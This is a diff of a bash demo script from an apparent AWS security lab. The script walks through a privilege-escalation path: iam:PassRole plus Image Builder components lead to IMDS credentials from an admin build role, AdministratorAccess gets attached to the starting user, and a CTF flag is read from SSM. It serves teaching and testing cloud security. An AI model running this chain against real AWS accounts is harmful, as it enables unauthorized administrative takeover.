@@ -1,4 +1,5 @@
 #!/bin/bash
+set -e
 
 # Demo script for iam:PassRole + imagebuilder:CreateComponent + CreateImageRecipe +
 # CreateInfrastructureConfiguration + CreateImage privilege escalation
@@ -116,20 +117,20 @@ use_readonly_creds() {
     unset AWS_SESSION_TOKEN
 }
 
-# [EXPLOIT] Step 2: Configure AWS credentials with starting user
+# Source demo permissions library for validation restriction
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"
+
+# Restrict helpful permissions during validation run
+restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
+
+# [EXPLOIT] Step 2: Verify starting user identity
 echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
 
 echo "Using region: $AWS_REGION"
-
-# [OBSERVATION] Verify starting user identity
-show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Arn' --output text"
-use_readonly_creds
-READONLY_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
-echo "ReadOnly identity: $READONLY_IDENTITY"
-
-use_starting_creds
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
@@ -148,7 +149,7 @@ ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# [OBSERVATION] Step 4: Verify we don't have admin permissions yet
+# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying starting user doesn't have admin permissions yet${NC}"
 use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
@@ -346,32 +347,34 @@ echo "  3. The component gets admin credentials from IMDS"
 echo "  4. Attaches AdministratorAccess to $STARTING_USER"
 echo ""
 echo "This typically takes 10-30+ minutes. Checking every 30 seconds..."
+echo "Note: The build may show FAILED in the end — the exploit runs during the BUILDING"
+echo "phase before AMI creation; a failed final AMI step does not prevent escalation."
 echo ""
 
-MAX_WAIT=2400  # 40 minutes
+MAX_WAIT=2700  # 45 minutes — Image Builder builds can take 10-30+ minutes
 WAIT_INTERVAL=30
 ELAPSED=0
 ESCALATION_SUCCEEDED=false
 
 while [ $ELAPSED -lt $MAX_WAIT ]; do
     MINUTES_ELAPSED=$((ELAPSED / 60))
-    SECONDS_REMAINING=$((ELAPSED % 60))
+    SECONDS_ELAPSED=$((ELAPSED % 60))
 
-    # Check image build status
+    # Check image build status (readonly creds — helpful permission, temporarily denied during validation)
     show_cmd "ReadOnly" "aws imagebuilder get-image --region $AWS_REGION --image-build-version-arn $IMAGE_BUILD_ARN --query 'image.state.status' --output text"
     IMAGE_STATUS=$(aws imagebuilder get-image \
-        --region $AWS_REGION \
+        --region "$AWS_REGION" \
         --image-build-version-arn "$IMAGE_BUILD_ARN" \
         --query 'image.state.status' \
-        --output text 2>/dev/null)
+        --output text 2>/dev/null || echo "UNKNOWN")
 
-    echo "Image build status: $IMAGE_STATUS (${MINUTES_ELAPSED}m ${SECONDS_REMAINING}s elapsed)"
+    echo "Image build status: $IMAGE_STATUS (${MINUTES_ELAPSED}m ${SECONDS_ELAPSED}s elapsed)"
 
     # Check if AdministratorAccess has been attached to starting user
     ADMIN_ATTACHED=$(aws iam list-attached-user-policies \
         --user-name "$STARTING_USER" \
         --query "AttachedPolicies[?PolicyArn=='arn:aws:iam::aws:policy/AdministratorAccess'].PolicyName" \
-        --output text 2>/dev/null)
+        --output text 2>/dev/null || echo "")
 
     if [ -n "$ADMIN_ATTACHED" ] && [ "$ADMIN_ATTACHED" != "None" ]; then
         echo -e "${GREEN}✓ AdministratorAccess detected on $STARTING_USER!${NC}"
@@ -379,13 +382,13 @@ while [ $ELAPSED -lt $MAX_WAIT ]; do
         break
     fi
 
-    # If the image build failed, the exploit may not have run
+    # If the image build failed, check one more time for the policy —
+    # the exploit may have attached the policy before the build failed (e.g., AMI creation failed)
     if [ "$IMAGE_STATUS" == "FAILED" ]; then
-        # Check one more time for the policy - it may have attached before the build failed
         ADMIN_ATTACHED=$(aws iam list-attached-user-policies \
             --user-name "$STARTING_USER" \
             --query "AttachedPolicies[?PolicyArn=='arn:aws:iam::aws:policy/AdministratorAccess'].PolicyName" \
-            --output text 2>/dev/null)
+            --output text 2>/dev/null || echo "")
 
         if [ -n "$ADMIN_ATTACHED" ] && [ "$ADMIN_ATTACHED" != "None" ]; then
             echo -e "${GREEN}✓ AdministratorAccess detected on $STARTING_USER (build failed after exploit ran)!${NC}"
@@ -393,23 +396,29 @@ while [ $ELAPSED -lt $MAX_WAIT ]; do
             break
         fi
 
-        echo -e "${RED}Image build failed before exploit could run${NC}"
+        # Fetch failure reason for diagnosis
         IMAGE_REASON=$(aws imagebuilder get-image \
-            --region $AWS_REGION \
+            --region "$AWS_REGION" \
             --image-build-version-arn "$IMAGE_BUILD_ARN" \
             --query 'image.state.reason' \
-            --output text 2>/dev/null)
+            --output text 2>/dev/null || echo "Unknown reason")
+        echo -e "${RED}Image build failed before exploit could run${NC}"
         echo "Failure reason: $IMAGE_REASON"
+        echo "Build ARN: $IMAGE_BUILD_ARN"
+        echo "Infra config ARN: $INFRA_CONFIG_ARN"
+        echo "Recipe ARN: $RECIPE_ARN"
+        echo "Component ARN: $COMPONENT_ARN"
+        echo "Hint: Check the Image Builder console for detailed build logs and SSM Agent connectivity."
         rm -f /tmp/imagebuilder-component.yaml
         exit 1
     fi
 
-    # If the image completed successfully, check for policy one more time
+    # If the image completed successfully, check for policy
     if [ "$IMAGE_STATUS" == "AVAILABLE" ]; then
         ADMIN_ATTACHED=$(aws iam list-attached-user-policies \
             --user-name "$STARTING_USER" \
             --query "AttachedPolicies[?PolicyArn=='arn:aws:iam::aws:policy/AdministratorAccess'].PolicyName" \
-            --output text 2>/dev/null)
+            --output text 2>/dev/null || echo "")
 
         if [ -n "$ADMIN_ATTACHED" ] && [ "$ADMIN_ATTACHED" != "None" ]; then
             echo -e "${GREEN}✓ AdministratorAccess detected on $STARTING_USER!${NC}"
@@ -417,20 +426,20 @@ while [ $ELAPSED -lt $MAX_WAIT ]; do
             break
         fi
 
-        echo -e "${YELLOW}Image build completed but AdministratorAccess not detected yet${NC}"
-        echo "Waiting 15 seconds for IAM propagation..."
+        echo -e "${YELLOW}Image build completed but AdministratorAccess not detected yet — waiting for IAM propagation...${NC}"
         sleep 15
 
         ADMIN_ATTACHED=$(aws iam list-attached-user-policies \
             --user-name "$STARTING_USER" \
             --query "AttachedPolicies[?PolicyArn=='arn:aws:iam::aws:policy/AdministratorAccess'].PolicyName" \
-            --output text 2>/dev/null)
+            --output text 2>/dev/null || echo "")
 
         if [ -n "$ADMIN_ATTACHED" ] && [ "$ADMIN_ATTACHED" != "None" ]; then
             echo -e "${GREEN}✓ AdministratorAccess detected on $STARTING_USER!${NC}"
             ESCALATION_SUCCEEDED=true
         else
             echo -e "${RED}Error: Image build completed but exploit did not succeed${NC}"
+            echo "Build ARN: $IMAGE_BUILD_ARN"
             rm -f /tmp/imagebuilder-component.yaml
             exit 1
         fi
@@ -442,47 +451,90 @@ while [ $ELAPSED -lt $MAX_WAIT ]; do
 done
 
 if [ "$ESCALATION_SUCCEEDED" != "true" ]; then
-    echo -e "${RED}Error: Privilege escalation did not succeed within 40 minutes${NC}"
+    echo -e "${RED}Error: Privilege escalation did not succeed within 45 minutes${NC}"
     echo "Image build status: $IMAGE_STATUS"
-    echo "The build may still be in progress. Check the Image Builder console."
+    echo "Build ARN: $IMAGE_BUILD_ARN"
+    echo "The build may still be in progress. Check the Image Builder console for build logs."
     rm -f /tmp/imagebuilder-component.yaml
     exit 1
 fi
 echo ""
 
 # [OBSERVATION] Step 11: Verify admin access
-use_readonly_creds
-echo -e "${YELLOW}Step 11: Verifying privilege escalation success${NC}"
-
-# Wait for IAM propagation
-echo "Waiting 15 seconds for IAM policy propagation..."
+# Wait for IAM policy propagation before attempting admin actions
+echo -e "${YELLOW}Step 11: Waiting for IAM policy propagation${NC}"
+echo "Sleeping 15 seconds after iam:AttachUserPolicy for IAM propagation..."
 sleep 15
 
-# Check attached policies
+use_readonly_creds
+echo -e "${YELLOW}Step 11 (continued): Verifying privilege escalation success${NC}"
+
 echo "Checking attached policies on starting user..."
 show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --output table"
-ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name $STARTING_USER --output table 2>&1)
+ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name "$STARTING_USER" --output table 2>&1)
 echo "$ATTACHED_POLICIES"
 echo -e "${GREEN}✓ AdministratorAccess policy confirmed on $STARTING_USER${NC}"
 echo ""
 
-# Verify actual admin access
-echo "Attempting to list IAM users..."
-show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
+# Verify actual admin access using the starting user's now-elevated credentials
+use_starting_creds
+echo "Attempting to list IAM users as starting user (now with admin access)..."
+show_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
 else
     echo -e "${RED}✗ Failed to list users (IAM may still be propagating)${NC}"
+    exit 1
+fi
+echo ""
+
+# [EXPLOIT]
+# Step 12: Capture the CTF flag
+# The starting user now has AdministratorAccess attached, which grants ssm:GetParameter
+# implicitly. Use those credentials to read the scenario flag from SSM Parameter Store.
+# Retry briefly to absorb IAM propagation lag — AdministratorAccess was just attached,
+# and ssm:GetParameter sometimes lags behind iam:ListUsers across AWS service caches.
+use_starting_creds
+echo -e "${YELLOW}Step 12: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/imagebuilder-001-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+
+FLAG_VALUE=""
+SSM_ERR=""
+for attempt in 1 2 3 4; do
+    SSM_ERR=$(aws ssm get-parameter --region "$AWS_REGION" --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>&1 > /tmp/flag_value_$$) || true
+    FLAG_VALUE=$(cat /tmp/flag_value_$$ 2>/dev/null)
+    if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+        break
+    fi
+    if [ "$attempt" -lt 4 ]; then
+        echo -e "${YELLOW}Flag read attempt $attempt did not succeed yet (likely IAM propagation); retrying in 10s...${NC}"
+        sleep 10
+    fi
+done
+rm -f /tmp/flag_value_$$
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME after 4 attempts${NC}"
+    if [ -n "$SSM_ERR" ]; then
+        echo -e "${RED}Last error: $SSM_ERR${NC}"
+    fi
+    exit 1
 fi
 echo ""
 
 # Clean up temporary files
 rm -f /tmp/imagebuilder-component.yaml
 
+# Restore helpful permissions for manual exploration
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
 # Final summary
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (with iam:PassRole, imagebuilder:Create* permissions)"
@@ -493,6 +545,7 @@ echo "5. Created image, triggering EC2 build instance with admin role"
 echo "6. Build instance executed component, got admin credentials from IMDS"
 echo "7. Component attached AdministratorAccess to starting user"
 echo "8. Achieved: Administrator Access"
+echo "9. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo "  $STARTING_USER → (imagebuilder:CreateComponent) → Malicious component"
@@ -500,6 +553,7 @@ echo "  → (imagebuilder:CreateImageRecipe) → Recipe with malicious component
 echo "  → (iam:PassRole + imagebuilder:CreateInfrastructureConfiguration) → Admin instance profile"
 echo "  → (imagebuilder:CreateImage) → EC2 build instance with admin role"
 echo "  → IMDS credentials → iam:AttachUserPolicy → Admin"
+echo "  → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
